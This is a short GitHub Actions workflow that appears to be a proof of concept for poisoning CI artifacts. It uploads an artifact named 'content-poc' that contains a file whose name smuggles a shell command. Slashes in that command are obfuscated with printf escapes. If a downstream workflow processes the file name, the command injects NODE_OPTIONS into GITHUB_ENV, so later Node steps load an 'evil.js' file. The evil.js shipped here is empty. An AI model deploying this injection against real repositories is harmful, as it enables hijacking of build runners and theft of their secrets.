name: Test

on:
  workflow_dispatch:
  push:
    branches: [main]

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact
        run: |
          set -e
          mkdir -p content
          printf 'hello\n' > content/test.txt
          printf 'marker\n' > content/a
          printf 'x\n' > 'content/a;sed -i 1iNODE_OPTIONS=--require=$(printf \\057)tmp$(printf \\057)content$(printf \\057)content-poc$(printf \\057)evil.js $GITHUB_ENV;true;#.txt'
          echo '' | base64 -d > content/evil.js
          printf '1\n' > content/pr_number.txt
      - uses: actions/upload-artifact@v4
        with:
          name: content-poc
          path: content/
